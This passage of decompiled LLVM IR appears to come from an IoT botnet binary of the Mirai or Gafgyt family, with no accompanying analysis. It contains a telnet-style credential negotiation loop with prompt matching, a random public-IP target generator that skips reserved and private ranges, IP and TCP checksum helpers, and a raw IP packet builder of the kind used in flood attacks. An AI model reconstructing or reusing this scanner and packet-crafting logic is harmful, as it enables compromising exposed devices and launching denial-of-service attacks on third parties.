dec_label_pc_a6e8:                                ; preds = %dec_label_pc_a6d0
  %v2_a6f0 = add i32 %v6_a6b8, %stack_var_-40.0
  %v2_a6fc = load i8, i8* %v5_a6a4, align 1
  %v2_a700 = icmp eq i8 %v2_a6fc, -1
  br i1 %v2_a700, label %dec_label_pc_a708, label %dec_label_pc_a788

dec_label_pc_a708:                                ; preds = %dec_label_pc_a6e8
  %v1_a70c = add i32 %v2_a6a0, 1
  %v5_a720 = call i32 @__libc_recv(i32 %arg1, i32 %v1_a70c, i32 2, i32 0, i32 %v2_a6f0)
  %v7_a730 = icmp eq i32 %v5_a720, -1
  br i1 %v7_a730, label %dec_label_pc_a744, label %dec_label_pc_a738

dec_label_pc_a738:                                ; preds = %dec_label_pc_a708
  %v2_a73c = icmp eq i32 %v5_a720, 0
  br i1 %v2_a73c, label %dec_label_pc_a744, label %dec_label_pc_a750

dec_label_pc_a744:                                ; preds = %dec_label_pc_a738, %dec_label_pc_a708
  br label %dec_label_pc_a818

dec_label_pc_a750:                                ; preds = %dec_label_pc_a738
  %v2_a758 = add i32 %v5_a720, %v2_a6f0
  %v5_a76c = call i32 @negotiate(i32 %arg1, i32 %v2_a6a0, i32 3, i32 %v2_a758, i32 %v2_a758)
  %v2_a774 = icmp eq i32 %v5_a76c, 0
  br i1 %v2_a774, label %dec_label_pc_a77c, label %dec_label_pc_a7cc

dec_label_pc_a77c:                                ; preds = %dec_label_pc_a750
  br label %dec_label_pc_a818

dec_label_pc_a788:                                ; preds = %dec_label_pc_a6e8
  %v3_a6fc = zext i8 %v2_a6fc to i32
  %v7_a790 = call i32 @strstr(i32 %arg6, i8* %v6_a790, i32 %stack_var_-40.0, i32 %v3_a6fc, i32 %v2_a6f0, i32 %v6_a6b8)
  %v2_a798 = icmp eq i32 %v7_a790, 0
  br i1 %v2_a798, label %dec_label_pc_a7a0, label %dec_label_pc_a804

dec_label_pc_a7a0:                                ; preds = %dec_label_pc_a788
  br i1 %v2_a7a4, label %dec_label_pc_a7cc, label %dec_label_pc_a7ac

dec_label_pc_a7ac:                                ; preds = %dec_label_pc_a7a0
  %v2_a7b0 = call i32 @matchPrompt(i8* %v1_a7b0)
  %v2_a7b8 = icmp eq i32 %v2_a7b0, 0
  br i1 %v2_a7b8, label %dec_label_pc_a7cc, label %dec_label_pc_a804

dec_label_pc_a7cc:                                ; preds = %dec_label_pc_a750, %dec_label_pc_a7ac, %dec_label_pc_a7a0, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a758, %dec_label_pc_a750 ], [ %v2_a6f0, %dec_label_pc_a7a0 ], [ %v2_a6f0, %dec_label_pc_a7ac ]
  %v1_a7d0 = add i32 %stack_var_-40.0, 2
  %v6_a7dc = icmp slt i32 %v1_a7d0, %arg7
  br i1 %v6_a7dc, label %dec_label_pc_a7e0, label %dec_label_pc_a810

dec_label_pc_a7e0:                                ; preds = %dec_label_pc_a7cc
  %v3_a7e0 = load i32, i32* %stack_var_-176, align 4
  %v5_a7e8 = icmp sgt i32 %v3_a7e0, 0
  br i1 %v5_a7e8, label %dec_label_pc_a5ec.lr.ph, label %dec_label_pc_a7ec

dec_label_pc_a7ec:                                ; preds = %dec_label_pc_a7e0
  br i1 %v5_a7f4, label %dec_label_pc_a5ec.lr.ph, label %dec_label_pc_a810

dec_label_pc_a804:                                ; preds = %dec_label_pc_a788, %dec_label_pc_a7ac
  br label %dec_label_pc_a818

dec_label_pc_a810:                                ; preds = %dec_label_pc_a614, %dec_label_pc_a7ec, %dec_label_pc_a7cc
  br label %dec_label_pc_a818

dec_label_pc_a818:                                ; preds = %dec_label_pc_a804, %dec_label_pc_a77c, %dec_label_pc_a744, %dec_label_pc_a6dc, %dec_label_pc_a810
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_a810 ], [ 1, %dec_label_pc_a804 ], [ 0, %dec_label_pc_a6dc ], [ 0, %dec_label_pc_a744 ], [ 0, %dec_label_pc_a77c ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 3, 1, 0, 2 }
  uselistorder i32 %v5_a720, { 1, 2, 0 }
  uselistorder i8 %v2_a6fc, { 1, 0 }
  uselistorder i32 %v2_a6f0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v6_a6b8, { 2, 1, 3, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a5d8, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_a818, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a810, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a804, { 1, 0 }
  uselistorder label %dec_label_pc_a7cc, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a5ec, { 1, 0 }
  uselistorder label %dec_label_pc_a5ec.lr.ph, { 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_a830 = load i32, i32* @r4, align 4
  %v6_a830 = load i32, i32* @fp, align 4
  %v13_a830 = load i32, i32* @lr, align 4
  store i32 43064, i32* %stack_var_-4, align 4
  %v2_a834 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a834, i32* @fp, align 4
  %v0_a83c = call i32 @rand()
  %v2_a858 = sdiv i32 %v0_a83c, 49
  %tmp27 = mul i32 %v2_a858, -223
  %v2_a878 = add i32 %tmp27, %v0_a83c
  %v1_a88c = trunc i32 %v2_a878 to i8
  store i8 %v1_a88c, i8* bitcast (i8** @global_var_272eb.71 to i8*), align 4
  %v0_a890 = call i32 @rand()
  %v2_a8ac = sdiv i32 %v0_a890, 51
  %tmp28 = mul i32 %v2_a8ac, -255
  %v2_a8c4 = add i32 %tmp28, %v0_a890
  %v1_a8d8 = trunc i32 %v2_a8c4 to i8
  store i8 %v1_a8d8, i8* @global_var_272ec.73, align 1
  %v0_a8dc = call i32 @rand()
  %v2_a8f8 = sdiv i32 %v0_a8dc, 51
  %tmp29 = mul i32 %v2_a8f8, -255
  %v2_a910 = add i32 %tmp29, %v0_a8dc
  %v1_a924 = trunc i32 %v2_a910 to i8
  store i8 %v1_a924, i8* @global_var_272ed.74, align 1
  %v0_a928 = call i32 @rand()
  %v2_a944 = sdiv i32 %v0_a928, 51
  %tmp = mul i32 %v2_a944, -255
  %v2_a95c = add i32 %v0_a928, %tmp
  %extract.t = trunc i32 %v2_a95c to i8
  br label %dec_label_pc_aab0

dec_label_pc_a978:                                ; preds = %dec_label_pc_acc0, %dec_label_pc_acb0, %dec_label_pc_aca0, %dec_label_pc_ac90, %dec_label_pc_ac80, %dec_label_pc_ac70, %dec_label_pc_ac60, %dec_label_pc_ac50, %dec_label_pc_ac40, %dec_label_pc_ac30, %dec_label_pc_ac20, %dec_label_pc_ac10, %dec_label_pc_ac00, %dec_label_pc_abf0, %dec_label_pc_abe0, %dec_label_pc_abb0, %dec_label_pc_ab90, %dec_label_pc_ab60, %dec_label_pc_ab30, %dec_label_pc_ab10, %dec_label_pc_ab00, %dec_label_pc_aaf0, %dec_label_pc_aae0, %dec_label_pc_aad0, %dec_label_pc_aac0, %dec_label_pc_aab0
  %v0_a978 = call i32 @rand()
  %v2_a994 = sdiv i32 %v0_a978, 49
  %tmp30 = mul i32 %v2_a994, -223
  %v2_a9b4 = add i32 %tmp30, %v0_a978
  %v1_a9c8 = trunc i32 %v2_a9b4 to i8
  store i8 %v1_a9c8, i8* bitcast (i8** @global_var_272eb.71 to i8*), align 4
  %v0_a9cc = call i32 @rand()
  %v2_a9e8 = sdiv i32 %v0_a9cc, 51
  %tmp31 = mul i32 %v2_a9e8, -255
  %v2_aa00 = add i32 %tmp31, %v0_a9cc
  %v1_aa14 = trunc i32 %v2_aa00 to i8
  store i8 %v1_aa14, i8* @global_var_272ec.73, align 1
  %v0_aa18 = call i32 @rand()
  %v2_aa34 = sdiv i32 %v0_aa18, 51
  %tmp32 = mul i32 %v2_aa34, -255
  %v2_aa4c = add i32 %tmp32, %v0_aa18
  %v1_aa60 = trunc i32 %v2_aa4c to i8
  store i8 %v1_aa60, i8* @global_var_272ed.74, align 1
  %v0_aa64 = call i32 @rand()
  %v2_aa80 = sdiv i32 %v0_aa64, 51
  %tmp39 = mul i32 %v2_aa80, -255
  %v2_aa98 = add i32 %v0_aa64, %tmp39
  %extract.t38 = trunc i32 %v2_aa98 to i8
  br label %dec_label_pc_aab0

dec_label_pc_aab0:                                ; preds = %entry, %dec_label_pc_a978
  %v2_a95c.sink.off0 = phi i8 [ %extract.t, %entry ], [ %extract.t38, %dec_label_pc_a978 ]
  store i8 %v2_a95c.sink.off0, i8* @global_var_272ee.75, align 1
  %v2_aab4 = load i8, i8* bitcast (i8** @global_var_272eb.71 to i8*), align 4
  %v3_aab4 = zext i8 %v2_aab4 to i32
  %v7_aab8 = icmp eq i8 %v2_aab4, 127
  br i1 %v7_aab8, label %dec_label_pc_a978, label %dec_label_pc_aac0

dec_label_pc_aac0:                                ; preds = %dec_label_pc_aab0
  %v2_aac8 = icmp eq i8 %v2_aab4, 0
  br i1 %v2_aac8, label %dec_label_pc_a978, label %dec_label_pc_aad0

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aac0
  %v7_aad8 = icmp eq i8 %v2_aab4, 3
  br i1 %v7_aad8, label %dec_label_pc_a978, label %dec_label_pc_aae0

dec_label_pc_aae0:                                ; preds = %dec_label_pc_aad0
  %v7_aae8 = icmp eq i8 %v2_aab4, 15
  br i1 %v7_aae8, label %dec_label_pc_a978, label %dec_label_pc_aaf0

dec_label_pc_aaf0:                                ; preds = %dec_label_pc_aae0
  %v7_aaf8 = icmp eq i8 %v2_aab4, 16
  br i1 %v7_aaf8, label %dec_label_pc_a978, label %dec_label_pc_ab00

dec_label_pc_ab00:                                ; preds = %dec_label_pc_aaf0
  %v7_ab08 = icmp eq i8 %v2_aab4, 56
  br i1 %v7_ab08, label %dec_label_pc_a978, label %dec_label_pc_ab10

dec_label_pc_ab10:                                ; preds = %dec_label_pc_ab00
  %v7_ab18 = icmp eq i8 %v2_aab4, 10
  br i1 %v7_ab18, label %dec_label_pc_a978, label %dec_label_pc_ab20

dec_label_pc_ab20:                                ; preds = %dec_label_pc_ab10
  %v7_ab28 = icmp eq i8 %v2_aab4, -64
  br i1 %v7_ab28, label %dec_label_pc_ab30, label %dec_label_pc_ab40

dec_label_pc_ab30:                                ; preds = %dec_label_pc_ab20
  %v3_ab34 = load i8, i8* @global_var_272ec.73, align 1
  %v7_ab38 = icmp eq i8 %v3_ab34, -88
  br i1 %v7_ab38, label %dec_label_pc_a978, label %dec_label_pc_ab40

dec_label_pc_ab40:                                ; preds = %dec_label_pc_ab20, %dec_label_pc_ab30
  %v7_ab48 = icmp eq i8 %v2_aab4, -84
  br i1 %v7_ab48, label %dec_label_pc_ab50, label %dec_label_pc_ab70

dec_label_pc_ab50:                                ; preds = %dec_label_pc_ab40
  %v3_ab54 = load i8, i8* @global_var_272ec.73, align 1
  %tmp40 = icmp ult i8 %v3_ab54, 16
  br i1 %tmp40, label %dec_label_pc_ab70, label %dec_label_pc_ab60

dec_label_pc_ab60:                                ; preds = %dec_label_pc_ab50
  %tmp41 = icmp ult i8 %v3_ab54, 32
  br i1 %tmp41, label %dec_label_pc_a978, label %dec_label_pc_ab70

dec_label_pc_ab70:                                ; preds = %dec_label_pc_ab40, %dec_label_pc_ab60, %dec_label_pc_ab50
  %v7_ab78 = icmp eq i8 %v2_aab4, 100
  br i1 %v7_ab78, label %dec_label_pc_ab80, label %dec_label_pc_aba0

dec_label_pc_ab80:                                ; preds = %dec_label_pc_ab70
  %v3_ab84 = load i8, i8* @global_var_272ec.73, align 1
  %tmp42 = icmp ult i8 %v3_ab84, 64
  br i1 %tmp42, label %dec_label_pc_aba0, label %dec_label_pc_ab90

dec_label_pc_ab90:                                ; preds = %dec_label_pc_ab80
  %tmp43 = icmp ult i8 %v3_ab84, 127
  br i1 %tmp43, label %dec_label_pc_a978, label %dec_label_pc_aba0

dec_label_pc_aba0:                                ; preds = %dec_label_pc_ab70, %dec_label_pc_ab90, %dec_label_pc_ab80
  %v7_aba8 = icmp eq i8 %v2_aab4, -87
  br i1 %v7_aba8, label %dec_label_pc_abb0, label %dec_label_pc_abc0

dec_label_pc_abb0:                                ; preds = %dec_label_pc_aba0
  %v3_abb4 = load i8, i8* @global_var_272ec.73, align 1
  %v2_abb8 = icmp eq i8 %v3_abb4, -1
  br i1 %v2_abb8, label %dec_label_pc_a978, label %dec_label_pc_abc0

dec_label_pc_abc0:                                ; preds = %dec_label_pc_aba0, %dec_label_pc_abb0
  %v7_abc8 = icmp eq i8 %v2_aab4, -58
  br i1 %v7_abc8, label %dec_label_pc_abd0, label %dec_label_pc_abf0

dec_label_pc_abd0:                                ; preds = %dec_label_pc_abc0
  %v3_abd4 = load i8, i8* @global_var_272ec.73, align 1
  %tmp44 = icmp ult i8 %v3_abd4, 18
  br i1 %tmp44, label %dec_label_pc_abf0, label %dec_label_pc_abe0

dec_label_pc_abe0:                                ; preds = %dec_label_pc_abd0
  %tmp45 = or i8 %v3_abd4, 1
  %tmp46 = icmp eq i8 %tmp45, 19
  br i1 %tmp46, label %dec_label_pc_a978, label %dec_label_pc_abf0

dec_label_pc_abf0:                                ; preds = %dec_label_pc_abc0, %dec_label_pc_abe0, %dec_label_pc_abd0
  %v7_abf8 = icmp eq i8 %v2_aab4, -32
  br i1 %v7_abf8, label %dec_label_pc_a978, label %dec_label_pc_ac00

dec_label_pc_ac00:                                ; preds = %dec_label_pc_abf0
  %v7_ac08 = icmp eq i8 %v2_aab4, 6
  br i1 %v7_ac08, label %dec_label_pc_a978, label %dec_label_pc_ac10

dec_label_pc_ac10:                                ; preds = %dec_label_pc_ac00
  %v7_ac18 = icmp eq i8 %v2_aab4, 7
  br i1 %v7_ac18, label %dec_label_pc_a978, label %dec_label_pc_ac20

dec_label_pc_ac20:                                ; preds = %dec_label_pc_ac10
  %v7_ac28 = icmp eq i8 %v2_aab4, 11
  br i1 %v7_ac28, label %dec_label_pc_a978, label %dec_label_pc_ac30

dec_label_pc_ac30:                                ; preds = %dec_label_pc_ac20
  %v7_ac38 = icmp eq i8 %v2_aab4, 21
  br i1 %v7_ac38, label %dec_label_pc_a978, label %dec_label_pc_ac40

dec_label_pc_ac40:                                ; preds = %dec_label_pc_ac30
  %v7_ac48 = icmp eq i8 %v2_aab4, 22
  br i1 %v7_ac48, label %dec_label_pc_a978, label %dec_label_pc_ac50

dec_label_pc_ac50:                                ; preds = %dec_label_pc_ac40
  %v7_ac58 = icmp eq i8 %v2_aab4, 26
  br i1 %v7_ac58, label %dec_label_pc_a978, label %dec_label_pc_ac60

dec_label_pc_ac60:                                ; preds = %dec_label_pc_ac50
  %v7_ac68 = icmp eq i8 %v2_aab4, 28
  br i1 %v7_ac68, label %dec_label_pc_a978, label %dec_label_pc_ac70

dec_label_pc_ac70:                                ; preds = %dec_label_pc_ac60
  %v7_ac78 = icmp eq i8 %v2_aab4, 29
  br i1 %v7_ac78, label %dec_label_pc_a978, label %dec_label_pc_ac80

dec_label_pc_ac80:                                ; preds = %dec_label_pc_ac70
  %v7_ac88 = icmp eq i8 %v2_aab4, 30
  br i1 %v7_ac88, label %dec_label_pc_a978, label %dec_label_pc_ac90

dec_label_pc_ac90:                                ; preds = %dec_label_pc_ac80
  %v7_ac98 = icmp eq i8 %v2_aab4, 33
  br i1 %v7_ac98, label %dec_label_pc_a978, label %dec_label_pc_aca0

dec_label_pc_aca0:                                ; preds = %dec_label_pc_ac90
  %v7_aca8 = icmp eq i8 %v2_aab4, 55
  br i1 %v7_aca8, label %dec_label_pc_a978, label %dec_label_pc_acb0

dec_label_pc_acb0:                                ; preds = %dec_label_pc_aca0
  %v7_acb8 = icmp eq i8 %v2_aab4, -42
  br i1 %v7_acb8, label %dec_label_pc_a978, label %dec_label_pc_acc0

dec_label_pc_acc0:                                ; preds = %dec_label_pc_acb0
  %v7_acc8 = icmp eq i8 %v2_aab4, -41
  br i1 %v7_acc8, label %dec_label_pc_a978, label %dec_label_pc_acd0

dec_label_pc_acd0:                                ; preds = %dec_label_pc_acc0
  %v2_acd0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  %v3_ad18 = load i8, i8* @global_var_272ec.73, align 1
  %v4_ad18 = zext i8 %v3_ad18 to i32
  store i32 %v4_ad18, i32* @r4, align 4
  %v3_ad24 = load i8, i8* @global_var_272ed.74, align 1
  %v6_ad4c = sext i8 %v3_ad18 to i32
  %v8_ad4c = sext i8 %v3_ad24 to i32
  %v10_ad4c = sext i8 %v2_a95c.sink.off0 to i32
  %v11_ad4c = call i32 @szprintf(i32 %v2_acd0, i32 ptrtoint ([12 x i8]* @global_var_1cc18.77 to i32), i32 %v3_aab4, i32 %v6_ad4c, i32 %v8_ad4c, i32 %v10_ad4c)
  store i32 %v2_acd0, i32* @r0, align 4
  %v1_ad58 = call i32 @inet_addr(i32 %v2_acd0)
  store i32 %v3_a830, i32* @r4, align 4
  store i32 %v6_a830, i32* @fp, align 4
  store i32 %v13_a830, i32* @lr, align 4
  ret i32 %v1_ad58

; uselistorder directives
  uselistorder i32 %v2_acd0, { 2, 1, 0 }
  uselistorder i32 %v0_aa18, { 1, 0 }
  uselistorder i32 %v0_a9cc, { 1, 0 }
  uselistorder i32 %v0_a978, { 1, 0 }
  uselistorder i32 %v0_a8dc, { 1, 0 }
  uselistorder i32 %v0_a890, { 1, 0 }
  uselistorder i32 %v0_a83c, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* @global_var_272ed.74, { 2, 1, 0 }
  uselistorder i8* @global_var_272ec.73, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_272eb.71 to i8*), { 2, 0, 1 }
  uselistorder label %dec_label_pc_abf0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_abc0, { 1, 0 }
  uselistorder label %dec_label_pc_aba0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ab70, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ab40, { 1, 0 }
  uselistorder label %dec_label_pc_aab0, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_ad84 = load i32, i32* @fp, align 4
  %v2_ad98 = load i32, i32* @global_var_2d534.79, align 4
  %v1_ada0 = call i32 @__GI_ntohl(i32 %v2_ad98)
  %v2_adac = and i32 %v1_ada0, %arg1
  %v0_adb4 = call i32 @rand_cmwc()
  %v1_adc0 = sub i32 -1, %arg1
  %v2_adc4 = and i32 %v0_adb4, %v1_adc0
  %v2_adcc = xor i32 %v2_adc4, %v2_adac
  store i32 %v3_ad84, i32* @fp, align 4
  ret i32 %v2_adcc
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_ae589 = icmp sgt i32 %arg2, 1
  br i1 %v8_ae589, label %dec_label_pc_ae10, label %dec_label_pc_ae5c

dec_label_pc_ae10:                                ; preds = %entry, %dec_label_pc_ae10
  %v2_ae24 = phi i32 [ %v2_ae28, %dec_label_pc_ae10 ], [ 0, %entry ]
  %stack_var_-44.012 = phi i32 [ %v5_ae2c, %dec_label_pc_ae10 ], [ 0, %entry ]
  %stack_var_-40.011 = phi i32 [ %v1_ae48, %dec_label_pc_ae10 ], [ %arg2, %entry ]
  %stack_var_-36.010 = phi i16* [ %v5_ae40, %dec_label_pc_ae10 ], [ %arg1, %entry ]
  %v4_ae10 = ptrtoint i16* %stack_var_-36.010 to i32
  %v2_ae14 = load i16, i16* %stack_var_-36.010, align 2
  %v3_ae14 = zext i16 %v2_ae14 to i32
  %v2_ae28 = add i32 %v3_ae14, %v2_ae24
  %v3_ae28 = icmp ult i32 %v2_ae28, %v2_ae24
  %v4_ae2c = zext i1 %v3_ae28 to i32
  %v5_ae2c = add i32 %v4_ae2c, %stack_var_-44.012
  %v1_ae3c = add i32 %v4_ae10, 2
  %v5_ae40 = inttoptr i32 %v1_ae3c to i16*
  %v1_ae48 = add nsw i32 %stack_var_-40.011, -2
  %v8_ae58 = icmp sgt i32 %v1_ae48, 1
  br i1 %v8_ae58, label %dec_label_pc_ae10, label %dec_label_pc_ae50.dec_label_pc_ae5c_crit_edge

dec_label_pc_ae50.dec_label_pc_ae5c_crit_edge:    ; preds = %dec_label_pc_ae10
  br label %dec_label_pc_ae5c

dec_label_pc_ae5c:                                ; preds = %dec_label_pc_ae50.dec_label_pc_ae5c_crit_edge, %entry
  %v2_ae7c = phi i32 [ %v2_ae28, %dec_label_pc_ae50.dec_label_pc_ae5c_crit_edge ], [ 0, %entry ]
  %stack_var_-36.0.lcssa = phi i16* [ %v5_ae40, %dec_label_pc_ae50.dec_label_pc_ae5c_crit_edge ], [ %arg1, %entry ]
  %stack_var_-44.0.lcssa = phi i32 [ %v5_ae2c, %dec_label_pc_ae50.dec_label_pc_ae5c_crit_edge ], [ 0, %entry ]
  %v7_ae54.lcssa.in = phi i32 [ %v1_ae48, %dec_label_pc_ae50.dec_label_pc_ae5c_crit_edge ], [ %arg2, %entry ]
  %v7_ae54.lcssa = icmp eq i32 %v7_ae54.lcssa.in, 1
  br i1 %v7_ae54.lcssa, label %dec_label_pc_ae68, label %dec_label_pc_aee4.preheader

dec_label_pc_ae68:                                ; preds = %dec_label_pc_ae5c
  %v1_ae6c = bitcast i16* %stack_var_-36.0.lcssa to i8*
  %v2_ae6c = load i8, i8* %v1_ae6c, align 1
  %v3_ae6c = zext i8 %v2_ae6c to i32
  %v2_ae80 = add i32 %v3_ae6c, %v2_ae7c
  %v3_ae80 = icmp ult i32 %v2_ae80, %v2_ae7c
  %v4_ae84 = zext i1 %v3_ae80 to i32
  %v5_ae84 = add i32 %v4_ae84, %stack_var_-44.0.lcssa
  br label %dec_label_pc_aee4.preheader

dec_label_pc_aee4.preheader:                      ; preds = %dec_label_pc_ae68, %dec_label_pc_ae5c
  %v3_af10.ph = phi i32 [ %v2_ae7c, %dec_label_pc_ae5c ], [ %v2_ae80, %dec_label_pc_ae68 ]
  %stack_var_-44.1.ph = phi i32 [ %stack_var_-44.0.lcssa, %dec_label_pc_ae5c ], [ %v5_ae84, %dec_label_pc_ae68 ]
  %v3_aee837 = mul i32 %stack_var_-44.1.ph, 65536
  %v3_aef038 = udiv i32 %v3_af10.ph, 65536
  %v2_aef439 = or i32 %v3_aee837, %v3_aef038
  %v3_aefc40 = udiv i32 %stack_var_-44.1.ph, 65536
  %v2_af0441 = or i32 %v2_aef439, %v3_aefc40
  %v2_af0842 = icmp eq i32 %v2_af0441, 0
  br i1 %v2_af0842, label %dec_label_pc_af10, label %dec_label_pc_ae94

dec_label_pc_ae94:                                ; preds = %dec_label_pc_aee4.preheader, %dec_label_pc_ae94
  %v3_aefc45 = phi i32 [ %v3_aefc, %dec_label_pc_ae94 ], [ %v3_aefc40, %dec_label_pc_aee4.preheader ]
  %v2_aef444 = phi i32 [ %v2_aef4, %dec_label_pc_ae94 ], [ %v2_aef439, %dec_label_pc_aee4.preheader ]
  %v3_af1043 = phi i32 [ %v2_aed4, %dec_label_pc_ae94 ], [ %v3_af10.ph, %dec_label_pc_aee4.preheader ]
  %v2_aea8 = urem i32 %v3_af1043, 65536
  %v2_aed4 = add i32 %v2_aef444, %v2_aea8
  %v3_aed4 = icmp ult i32 %v2_aed4, %v2_aea8
  %v4_aed8 = zext i1 %v3_aed4 to i32
  %v5_aed8 = add nuw nsw i32 %v4_aed8, %v3_aefc45
  %v3_aee8 = mul i32 %v5_aed8, 65536
  %v3_aef0 = udiv i32 %v2_aed4, 65536
  %v2_aef4 = or i32 %v3_aee8, %v3_aef0
  %v3_aefc = udiv i32 %v5_aed8, 65536
  %v2_af04 = or i32 %v2_aef4, %v3_aefc
  %v2_af08 = icmp eq i32 %v2_af04, 0
  br i1 %v2_af08, label %dec_label_pc_aee4.dec_label_pc_af10_crit_edge, label %dec_label_pc_ae94

dec_label_pc_aee4.dec_label_pc_af10_crit_edge:    ; preds = %dec_label_pc_ae94
  br label %dec_label_pc_af10

dec_label_pc_af10:                                ; preds = %dec_label_pc_aee4.dec_label_pc_af10_crit_edge, %dec_label_pc_aee4.preheader
  %v3_af10.lcssa = phi i32 [ %v2_aed4, %dec_label_pc_aee4.dec_label_pc_af10_crit_edge ], [ %v3_af10.ph, %dec_label_pc_aee4.preheader ]
  %v1_af1c = urem i32 %v3_af10.lcssa, 65536
  %v3_af24 = xor i32 %v1_af1c, 65535
  ret i32 %v3_af24

; uselistorder directives
  uselistorder i32 %v2_aef4, { 1, 0 }
  uselistorder i32 %v5_aed8, { 1, 0 }
  uselistorder i32 %v2_aed4, { 2, 0, 3, 1 }
  uselistorder i32 %v3_aefc40, { 1, 0 }
  uselistorder i32 %stack_var_-44.1.ph, { 1, 0 }
  uselistorder i32 %v3_af10.ph, { 2, 1, 0 }
  uselistorder i32 %v2_ae7c, { 0, 2, 1 }
  uselistorder i32 %v1_ae48, { 0, 2, 1 }
  uselistorder i32 %v2_ae28, { 0, 2, 1 }
  uselistorder i32 %v2_ae24, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ae94, { 1, 0 }
  uselistorder label %dec_label_pc_ae10, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_af3c = load i32, i32* @fp, align 4
  store i32 44868, i32* %stack_var_-4, align 4
  %v2_af40 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_af40, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %v1_af60 = add i32 %arg1, 12
  %v2_af60 = inttoptr i32 %v1_af60 to i32*
  %v3_af60 = load i32, i32* %v2_af60, align 4
  store i32 %v3_af60, i32* %stack_var_-44, align 4
  %v1_af88 = call i32 @__GI_htons(i32 20)
  %v1_afa4 = call i32 @malloc(i32 32)
  %v2_afb0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_afb0, i32* @r3, align 4
  store i32 %v1_afa4, i32* @r0, align 4
  store i32 %v2_afb0, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_afc0 = call i32 @memcpy()
  %v1_afc8 = add i32 %v1_afa4, 12
  store i32 %v1_afc8, i32* @r3, align 4
  store i32 %v1_afc8, i32* @r0, align 4
  %v3_afd0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_afd0, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_afd8 = call i32 @memcpy()
  %v2_afe4 = inttoptr i32 %v1_afa4 to i16*
  %v3_afe4 = call i32 @csum(i16* %v2_afe4, i32 32)
  %sext = mul i32 %v3_afe4, 65536
  %v1_afe8 = sdiv i32 %sext, 65536
  store i32 %v1_afa4, i32* @r0, align 4
  %v0_aff4 = call i32 @free()
  %v4_aff8 = urem i32 %v1_afe8, 65536
  store i32 %v3_af3c, i32* @fp, align 4
  ret i32 %v4_aff8

; uselistorder directives
  uselistorder i32 %v1_afa4, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp3 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_b010 = load i32, i32* @fp, align 4
  store i8 69, i8* %arg1, align 1
  %v3_b07c = add i32 %tmp3, 1
  %v4_b07c = inttoptr i32 %v3_b07c to i8*
  store i8 0, i8* %v4_b07c, align 1
  %v3_b080 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_b080, 20
  %v1_b09c = trunc i32 %fold to i16
  %v3_b09c = add i32 %tmp3, 2
  %v4_b09c = inttoptr i32 %v3_b09c to i16*
  store i16 %v1_b09c, i16* %v4_b09c, align 2
  %v0_b0a0 = call i32 @rand_cmwc()
  %v1_b0b4 = trunc i32 %v0_b0a0 to i16
  %v3_b0b4 = add i32 %tmp3, 4
  %v4_b0b4 = inttoptr i32 %v3_b0b4 to i16*
  store i16 %v1_b0b4, i16* %v4_b0b4, align 2
  %v3_b0c0 = add i32 %tmp3, 6
  %v4_b0c0 = inttoptr i32 %v3_b0c0 to i16*
  store i16 0, i16* %v4_b0c0, align 2
  %v3_b0cc = add i32 %tmp3, 8
  %v4_b0cc = inttoptr i32 %v3_b0cc to i8*
  store i8 -1, i8* %v4_b0cc, align 1
  %v3_b0d8 = add i32 %tmp3, 9
  %v4_b0d8 = inttoptr i32 %v3_b0d8 to i8*
  store i8 %tmp, i8* %v4_b0d8, align 1
  %v3_b0e4 = add i32 %tmp3, 10
  %v4_b0e4 = inttoptr i32 %v3_b0e4 to i16*
  store i16 0, i16* %v4_b0e4, align 2
  %v2_b0f0 = add i32 %tmp3, 12
  %v3_b0f0 = inttoptr i32 %v2_b0f0 to i32*
  store i32 %arg3, i32* %v3_b0f0, align 4
  %v2_b0fc = add i32 %tmp3, 16
  %v3_b0fc = inttoptr i32 %v2_b0fc to i32*
